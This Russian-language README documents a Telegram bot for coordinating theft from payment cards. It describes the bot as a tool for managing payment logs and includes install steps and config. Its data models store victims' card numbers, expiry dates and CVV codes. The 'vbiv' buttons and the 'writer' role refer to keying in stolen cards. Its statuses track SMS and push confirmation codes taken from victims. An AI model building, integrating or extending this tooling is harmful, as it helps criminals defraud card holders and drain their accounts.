# Telegram Bot Module

Модульный Telegram бот для управления логами и обработки платежей. Этот архив содержит полный функционал бота, который можно легко интегрировать в любой проект.

## Функционал

- **Управление логами**: Создание, редактирование и отслеживание логов платежей
- **Система статусов**: SMS, PUSH, карта, баланс, успех, ошибки
- **Кастомные сцены**: Обработка кастомных вопросов и ошибок
- **База данных**: Поддержка SQLite для локальной разработки
- **Интерактивные кнопки**: Полнофункциональный интерфейс с inline-кнопками

## Структура проекта

```
telegram-bot-archive/
├── bot.js                 # Основной файл бота
├── config/
│   ├── config.js         # Конфигурация бота и базы данных
│   └── database.js       # Подключение к базе данных
├── handlers/
│   ├── scenes.js         # Настройка сцен Telegraf
│   ├── functions/        # Вспомогательные функции
│   │   ├── vbivButtons.js    # Генерация кнопок для вбива
│   │   ├── withWriter.js     # Кнопки с вбивером
│   │   ├── withOutWriter.js  # Кнопки без вбивера
│   │   └── writerMessage.js  # Сообщение для вбивера
│   └── scenes/           # Сцены бота
│       ├── custom.js         # Кастомные вопросы
│       └── customError.js    # Кастомные ошибки
├── models/
│   ├── index.js          # Индекс моделей Sequelize
│   ├── logs.js           # Модель логов
│   ├── products.js       # Модель продуктов
│   ├── victims.js        # Модель жертв
│   └── cart.js           # Модель корзины
├── locale/
│   └── text.js           # Локализация текстов
├── package.json          # Зависимости проекта
└── README.md            # Документация
```

## Установка и настройка

### 1. Установка зависимостей

```bash
npm install
```

### 2. Настройка переменных окружения

Создайте файл `.env` в корне проекта:

```env
BOT_TOKEN=your_telegram_bot_token
LOGS_GROUP_ID=your_logs_group_id
LOGGING_GROUP_ID=your_logging_group_id
NODE_ENV=development
```

### 3. Настройка базы данных

Бот использует SQLite для локальной разработки. База данных будет создана автоматически при первом запуске.

### 4. Запуск бота

```bash
npm start
```

## Интеграция в существующий проект

### 1. Скопируйте файлы

Скопируйте всю папку `telegram-bot-archive` в ваш проект или скопируйте только необходимые файлы.

### 2. Установите зависимости

```bash
npm install telegraf sequelize sqlite3 dotenv
```

### 3. Настройте конфигурацию

Отредактируйте `config/config.js` под ваши нужды:

```javascript
module.exports = {
  database: {
    dialect: "sqlite",
    storage: "./database.sqlite",
    logging: false
  },
  bot: {
    token: process.env.BOT_TOKEN || 'your_bot_token',
    logsGroupId: process.env.LOGS_GROUP_ID || 'your_logs_group',
    loggingGroupId: process.env.LOGGING_GROUP_ID || 'your_logging_group'
  }
};
```

### 4. Импортируйте бота

```javascript
const bot = require('./path/to/bot');
// или
const { Telegraf } = require('telegraf');
const config = require('./path/to/config/config');
const bot = new Telegraf(config.bot.token);
```

## Основные функции

### Обработка логов

- `log_take_<id>` - Взять лог в работу
- `log_<id>_leave` - Отказаться от лога
- `log_<id>_setStatus_<status>` - Изменить статус лога

### Статусы логов

- `success` - Успешная операция
- `sms` - Требуется SMS
- `push` - Требуется PUSH
- `card` - Проблема с картой
- `balance` - Проблема с балансом
- `skip` - Не бьется
- `change` - Сменить карту
- `custom` - Кастомный вопрос
- `customError` - Кастомная ошибка

### Сцены

- `custom` - Обработка кастомных вопросов
- `customError` - Обработка кастомных ошибок

## Модели данных

### Logs
- `cardNumber` - Номер карты
- `cardExp` - Срок действия карты
- `cardCvv` - CVV код
- `price` - Сумма платежа
- `writerId` - ID вбивера
- `status` - Статус лога
- `online` - Онлайн статус
- `error` - Текст ошибки
- `messageId` - ID сообщения в группе
- `writerMsgId` - ID сообщения у вбивера

## Безопасность

- Все токены и чувствительные данные хранятся в переменных окружения
- Обработка ошибок с логированием
- Проверка прав доступа к логам

## Поддержка

Для вопросов и поддержки обращайтесь к разработчику проекта.

## Лицензия

ISC License
